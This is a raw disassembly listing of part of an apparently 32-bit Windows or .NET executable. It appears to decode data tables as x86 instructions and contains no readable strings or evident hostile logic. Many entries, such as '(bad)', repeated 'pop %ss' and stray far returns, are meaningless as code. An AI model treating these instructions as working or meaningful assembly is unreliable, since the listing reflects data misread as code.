  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 46 0f             	add    %al,0xf(%esi)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 5f 0c             	add    %bl,0xc(%edi)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 4c 1d d2          	add    %cl,-0x2e(%ebp,%ebx,1)
  406a49:	02 64 00 ab          	add    -0x55(%eax,%eax,1),%ah
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 ed                	add    %ch,%ch
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 25 06 e1 02 68    	add    %ah,0x6802e106
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 69 10             	add    %ch,0x10(%ecx)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 ba 13 f6 02 6e    	add    %bh,0x6e02f613(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	17                   	pop    %ss
  406a9b:	15 0e 00 70 00       	adc    $0x70000e,%eax
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 7d 18             	add    %bh,0x18(%ebp)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 74 18 84          	add    %dh,-0x7c(%eax,%ebx,1)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	c1 0a 00             	rorl   $0x0,(%edx)
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 c1                	add    %al,%cl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 c1                	add    %al,%cl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 c1                	add    %al,%cl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 c1                	add    %al,%cl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 c1                	add    %al,%cl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 c1                	add    %al,%cl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 c1                	add    %al,%cl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 c1                	add    %al,%cl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 c1                	add    %al,%cl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b01:	00 64 13 00          	add    %ah,0x0(%ebx,%edx,1)
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 a7 08 00 00 03    	add    %ah,0x3000008(%edi)
  406b0d:	00 b1 10 00 00 04    	add    %dh,0x4000010(%ecx)
  406b13:	00 34 18             	add    %dh,(%eax,%ebx,1)
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	e4 12                	in     $0x12,%al
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	1a 0d 00 00 01 00    	sbb    0x10000,%cl
  406b26:	c0 0d 00 00 01 00 c0 	rorb   $0xc0,0x10000
  406b2d:	0d 00 00 01 00       	or     $0x10000,%eax
  406b32:	2a 0d 00 00 01 00    	sub    0x10000,%cl
  406b38:	e6 18                	out    %al,$0x18
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	bf 04 00 00 02       	mov    $0x2000004,%edi
  406b43:	00 0f                	add    %cl,(%edi)
  406b45:	1c 00                	sbb    $0x0,%al
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 74 1b 00          	add    %dh,0x0(%ebx,%ebx,1)
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 2a                	add    %ch,(%edx)
  406b51:	07                   	pop    %es
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	4f                   	dec    %edi
  406b57:	18 00                	sbb    %al,(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 32                	add    %dh,(%edx)
  406b5d:	1b 00                	sbb    (%eax),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 0d 17 00 00 01    	add    %cl,0x1000017
  406b67:	00 35 00 00 00 02    	add    %dh,0x2000000
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 64 13 00          	add    %ah,0x0(%ebx,%edx,1)
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 6c 0b 00          	add    %ch,0x0(%ebx,%ecx,1)
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 a2 07 00 00 02    	add    %ah,0x2000007(%edx)
  406b8b:	00 c1                	add    %al,%cl
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 c1                	add    %al,%cl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b9d:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406ba3:	00 27                	add    %ah,(%edi)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	57                   	push   %edi
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 f3                	add    %dh,%bl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 c7                	add    %al,%bh
  406bb7:	1b 00                	sbb    (%eax),%eax
  406bb9:	00 01                	add    %al,(%ecx)
  406bbb:	00 c7                	add    %al,%bh
  406bbd:	1b 00                	sbb    (%eax),%eax
  406bbf:	00 01                	add    %al,(%ecx)
  406bc1:	00 c7                	add    %al,%bh
  406bc3:	1b 00                	sbb    (%eax),%eax
  406bc5:	00 01                	add    %al,(%ecx)
  406bc7:	00 c7                	add    %al,%bh
  406bc9:	1b 00                	sbb    (%eax),%eax
  406bcb:	00 01                	add    %al,(%ecx)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 c7                	add    %al,%bh
  406bdb:	1b 00                	sbb    (%eax),%eax
  406bdd:	00 01                	add    %al,(%ecx)
  406bdf:	00 c7                	add    %al,%bh
  406be1:	1b 00                	sbb    (%eax),%eax
  406be3:	00 01                	add    %al,(%ecx)
  406be5:	00 d1                	add    %dl,%cl
  406be7:	18 00                	sbb    %al,(%eax)
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 61 16             	add    %ah,0x16(%ecx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	dd 16                	fstl   (%esi)
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	dd 16                	fstl   (%esi)
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	14 1c                	adc    $0x1c,%al
  406c00:	00 00                	add    %al,(%eax)
  406c02:	01 00                	add    %eax,(%eax)
  406c04:	14 1c                	adc    $0x1c,%al
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	14 1c                	adc    $0x1c,%al
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	14 1c                	adc    $0x1c,%al
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	14 1c                	adc    $0x1c,%al
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	c0 0d 00 00 01 00 ad 	rorb   $0xad,0x10000
  406c23:	0d 00 00 02 00       	or     $0x20000,%eax
  406c28:	b8 0d 00 00 01       	mov    $0x100000d,%eax
  406c2d:	00 c1                	add    %al,%cl
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c1                	add    %al,%cl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 c1                	add    %al,%cl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 3d 1c 00 00 01    	add    %bh,0x100001c
  406c45:	00 c1                	add    %al,%cl
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c51:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c57:	00 ce                	add    %cl,%dh
  406c59:	17                   	pop    %ss
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	01 00                	add    %eax,(%eax)
  406c5e:	ce                   	into
  406c5f:	17                   	pop    %ss
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	c1 0a 00             	rorl   $0x0,(%edx)
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 c1                	add    %al,%cl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 c1                	add    %al,%cl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 0a                	add    %cl,(%edx)
  406c77:	1d 00 00 02 00       	sbb    $0x20000,%eax
  406c7c:	c1 0a 00             	rorl   $0x0,(%edx)
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 0a                	add    %cl,(%edx)
  406c83:	1d 00 00 02 00       	sbb    $0x20000,%eax
  406c88:	c1 0a 00             	rorl   $0x0,(%edx)
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 21                	add    %ah,(%ecx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	21 07                	and    %eax,(%edi)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	6c                   	insb   (%dx),%es:(%edi)
  406c9b:	0d 00 00 01 00       	or     $0x10000,%eax
  406ca0:	c1 0a 00             	rorl   $0x0,(%edx)
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 6d 0e             	add    %ch,0xe(%ebp)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	72 0e                	jb     0x406cbc
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	72 0e                	jb     0x406cc2
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	dd 16                	fstl   (%esi)
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	21 07                	and    %eax,(%edi)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	ce                   	into
  406cc5:	17                   	pop    %ss
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	ce                   	into
  406ccb:	17                   	pop    %ss
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	c1 0a 00             	rorl   $0x0,(%edx)
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c1                	add    %al,%cl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 c1                	add    %al,%cl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 ce                	add    %cl,%dh
  406ce3:	17                   	pop    %ss
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	95                   	xchg   %eax,%ebp
  406ce9:	10 00                	adc    %al,(%eax)
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 ce                	add    %cl,%dh
  406cef:	17                   	pop    %ss
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	76 0b                	jbe    0x406d01
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	ce                   	into
  406cfb:	17                   	pop    %ss
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	ce                   	into
  406d01:	17                   	pop    %ss
  406d02:	00 00                	add    %al,(%eax)
  406d04:	01 00                	add    %eax,(%eax)
  406d06:	ce                   	into
  406d07:	17                   	pop    %ss
  406d08:	00 00                	add    %al,(%eax)
  406d0a:	02 00                	add    (%eax),%al
  406d0c:	7c 0e                	jl     0x406d1c
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	ce                   	into
  406d13:	17                   	pop    %ss
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	d4 16                	aam    $0x16
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	ce                   	into
  406d1f:	17                   	pop    %ss
  406d20:	00 00                	add    %al,(%eax)
  406d22:	02 00                	add    (%eax),%al
  406d24:	72 0e                	jb     0x406d34
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	ce                   	into
  406d2b:	17                   	pop    %ss
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	72 0e                	jb     0x406d40
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	ce                   	into
  406d37:	17                   	pop    %ss
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	6d                   	insl   (%dx),%es:(%edi)
  406d3d:	0e                   	push   %cs
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	ce                   	into
  406d43:	17                   	pop    %ss
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	77 0e                	ja     0x406d58
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	ce                   	into
  406d4f:	17                   	pop    %ss
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	77 0e                	ja     0x406d64
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	c7                   	(bad)
  406d5b:	1b 00                	sbb    (%eax),%eax
  406d5d:	00 01                	add    %al,(%ecx)
  406d5f:	00 c7                	add    %al,%bh
  406d61:	1b 16                	sbb    (%esi),%edx
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 00 1b bb    	add    %dh,-0x44e50000(%ecx)
  406d6f:	01 b1 00 ec 1b bf    	add    %esi,-0x40e41400(%ecx)
  406d75:	01 b1 00 db 19 0e    	add    %esi,0xe19db00(%ecx)
  406d7b:	00 b9 00 ff 14 64    	add    %bh,0x6414ff00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 17                	add    %dl,(%edi)
  406d85:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d8a:	17                   	pop    %ss
  406d8b:	15 0e 00 d9 00       	adc    $0xd9000e,%eax
  406d90:	17                   	pop    %ss
  406d91:	15 2e 03 e9 00       	adc    $0xe9032e,%eax
  406d96:	17                   	pop    %ss
  406d97:	15 6b 01 f1 00       	adc    $0xf1016b,%eax
  406d9c:	17                   	pop    %ss
  406d9d:	15 6b 01 f9 00       	adc    $0xf9016b,%eax
  406da2:	17                   	pop    %ss
  406da3:	15 6b 01 01 01       	adc    $0x101016b,%eax
  406da8:	17                   	pop    %ss
  406da9:	15 6b 01 09 01       	adc    $0x109016b,%eax
  406dae:	17                   	pop    %ss
  406daf:	15 6b 01 11 01       	adc    $0x111016b,%eax
  406db4:	17                   	pop    %ss
  406db5:	15 6b 01 19 01       	adc    $0x119016b,%eax
  406dba:	17                   	pop    %ss
  406dbb:	15 6b 01 21 01       	adc    $0x121016b,%eax
  406dc0:	17                   	pop    %ss
  406dc1:	15 6b 01 29 01       	adc    $0x129016b,%eax
  406dc6:	17                   	pop    %ss
  406dc7:	15 6b 01 31 01       	adc    $0x131016b,%eax
  406dcc:	17                   	pop    %ss
  406dcd:	15 4b 02 39 01       	adc    $0x139024b,%eax
  406dd2:	17                   	pop    %ss
  406dd3:	15 0e 00 41 01       	adc    $0x141000e,%eax
  406dd8:	17                   	pop    %ss
  406dd9:	15 6b 01 49 01       	adc    $0x149016b,%eax
  406dde:	96                   	xchg   %eax,%esi
  406ddf:	12 7f 00             	adc    0x0(%edi),%bh
  406de2:	51                   	push   %ecx
  406de3:	01 6e 00             	add    %ebp,0x0(%esi)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 05 1a 7f 00 51    	add    %eax,0x51007f1a
  406def:	01 76 10             	add    %esi,0x10(%esi)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	17                   	pop    %ss
  406df7:	15 0e 00 61 01       	adc    $0x161000e,%eax
  406dfc:	37                   	aaa
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	25 0c 2a 01 61       	and    $0x61012a0c,%eax
  406e07:	01 b4 0c d3 03 11 00 	add    %esi,0x1103d3(%esp,%ecx,1)
  406e0e:	17                   	pop    %ss
  406e0f:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e14:	dc 1c d9             	fcompl (%ecx,%ebx,8)
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	cb                   	lret
  406e21:	16                   	push   %ss
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 e2 01 c7 00    	addl   $0xc701e2,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	3c 0d                	cmp    $0xd,%al
  406e2e:	eb 03                	jmp    0x406e33
  406e30:	19 00                	sbb    %eax,(%eax)
  406e32:	17                   	pop    %ss
  406e33:	15 09 04 19 00       	adc    $0x190409,%eax
  406e38:	4c                   	dec    %esp
  406e39:	0b 01                	or     (%ecx),%eax
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 39                	add    %bh,(%ecx)
  406e3f:	0b 01                	or     (%ecx),%eax
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 81 1d 16 04 c1    	add    %eax,-0x3efbe9e3(%ecx)
  406e49:	01 f7                	add    %esi,%edi
  406e4b:	19 1c 04             	sbb    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	17                   	pop    %ss
  406e51:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e56:	f0 1b 23             	lock sbb (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 08                	add    %ecx,(%eax)
  406e5d:	16                   	push   %ss
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 5e 19             	add    %bl,0x19(%esi)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 34 03             	add    %dh,(%ebx,%eax,1)
  406e6a:	bf 01 19 00 5e       	mov    $0x5e001901,%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 17                	add    %edx,(%edi)
  406e75:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e7a:	17                   	pop    %ss
  406e7b:	15 36 02 99 01       	adc    $0x1990236,%eax
  406e80:	78 17                	js     0x406e99
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 50 0c             	add    %edx,0xc(%eax)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 f7             	roll   $0xf7,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 f0                	add    %esi,%eax
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 64 08 0e          	add    %esp,0xe(%eax,%ecx,1)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 17                	add    %edx,(%edi)
  406e9f:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406ea4:	17                   	pop    %ss
  406ea5:	15 56 04 21 00       	adc    $0x210456,%eax
  406eaa:	17                   	pop    %ss
  406eab:	15 5c 04 19 00       	adc    $0x19045c,%eax
  406eb0:	44                   	inc    %esp
  406eb1:	1b 66 04             	sbb    0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	6b 0c 47 02          	imul   $0x2,(%edi,%eax,2),%ecx
  406eba:	21 00                	and    %eax,(%eax)
  406ebc:	80 1a 6c             	sbbb   $0x6c,(%edx)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 17                	add    (%edi),%dl
  406ec3:	15 56 04 29 00       	adc    $0x290456,%eax
  406ec8:	17                   	pop    %ss
  406ec9:	15 78 04 31 02       	adc    $0x2310478,%eax
  406ece:	17                   	pop    %ss
  406ecf:	15 56 04 c1 00       	adc    $0xc10456,%eax
  406ed4:	07                   	pop    %es
  406ed5:	03 82 04 39 02 94    	add    -0x6bfdc6fc(%edx),%eax
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 88 17 96 04 c1    	add    %cl,-0x3efb69e9(%eax)
  406ee5:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 ff                	add    %bh,%bh
  406ef9:	02 a1 04 49 02 6e    	add    0x6e024904(%ecx),%ah
  406eff:	00 a7 04 c1 00 0c    	add    %ah,0xc00c104(%edi)
  406f05:	03 ae 04 51 02 17    	add    0x17025104(%esi),%ebp
  406f0b:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f10:	17                   	pop    %ss
  406f11:	15 b6 04 49 01       	adc    $0x14904b6,%eax
  406f16:	a9 1b bd 04 61       	test   $0x6104bd1b,%eax
  406f1b:	02 98 14 cf 04 49    	add    0x4904cf14(%eax),%bl
  406f21:	02 cb                	add    %bl,%cl
  406f23:	16                   	push   %ss
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 41 0f             	add    %al,0xf(%ecx)
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 e2                	add    %ah,%dl
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 17                	add    (%edi),%dl
  406f35:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f3a:	ad                   	lods   %ds:(%esi),%eax
  406f3b:	11 15 02 c1 00 47    	adc    %edx,0x4700c102
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	05 1a 9a 00 71       	add    $0x71009a1a,%eax
  406f4b:	02 56 19             	add    0x19(%esi),%dl
  406f4e:	0a 00                	or     (%eax),%al
  406f50:	59                   	pop    %ecx
  406f51:	01 e0                	add    %esp,%eax
  406f53:	15 c7 00 a1 02       	adc    $0x2a100c7,%eax
  406f58:	dc 07                	faddl  (%edi)
  406f5a:	01 05 79 02 17 15    	add    %eax,0x15170279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 58 18             	add    0x18(%eax),%bl
  406f66:	07                   	pop    %es
  406f67:	05 81 02 a2 06       	add    $0x6a20281,%eax
  406f6c:	0d 05 a9 02 eb       	or     $0xeb02a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 56 07 47    	add    0x47075602(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 8d 1d 16 04 81    	add    %ecx,-0x7efbe9e3(%ebp)
  406f81:	02 fb                	add    %bl,%bh
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	3c 0f                	cmp    $0xf,%al
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 17 15 0e    	add    %cl,0xe151702(%ecx)
  406f91:	00 89 02 f8 06 6b    	add    %cl,0x6b06f802(%ecx)
  406f97:	01 b1 02 e2 06 47    	add    %esi,0x4706e202(%ecx)
  406f9d:	02 a1 02 e9 10 c7    	add    -0x38ef16fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 d3                	add    %edx,%ebx
  406fa7:	18 1a                	sbb    %bl,(%edx)
  406fa9:	05 89 02 9b 18       	add    $0x189b0289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 bf 06 20 05 89    	add    -0x76fadffa(%edi),%bh
  406fb7:	02 2a                	add    (%edx),%ch
  406fb9:	1c 4b                	sbb    $0x4b,%al
  406fbb:	02 81 02 a9 1b 27    	add    0x271ba902(%ecx),%al
  406fc1:	05 c1 02 74 14       	add    $0x147402c1,%eax
  406fc6:	30 05 c9 02 72 08    	xor    %al,0x87202c9
  406fcc:	c7 00 91 02 d1 1c    	movl   $0x1cd10291,(%eax)
  406fd2:	35 05 c1 01 d3       	xor    $0xd301c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 b8 0a       	add    $0xab80291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 bc 18       	add    $0x18bc02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	d2 08                	rorb   %cl,(%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 17                	add    (%edi),%dl
  406fef:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ff4:	7e 16                	jle    0x40700c
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 05 07 c3       	mov    0xc3070502,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 d3                	add    %edx,%ebx
  407001:	18 01                	sbb    %al,(%ecx)
  407003:	05 99 02 17 15       	add    $0x15170299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 d2                	add    %dl,%dl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 60 0d             	add    0xd(%eax),%ah
  407014:	c3                   	ret
  407015:	00 a1 02 15 07 c7    	add    %ah,-0x38f8eafe(%ecx)
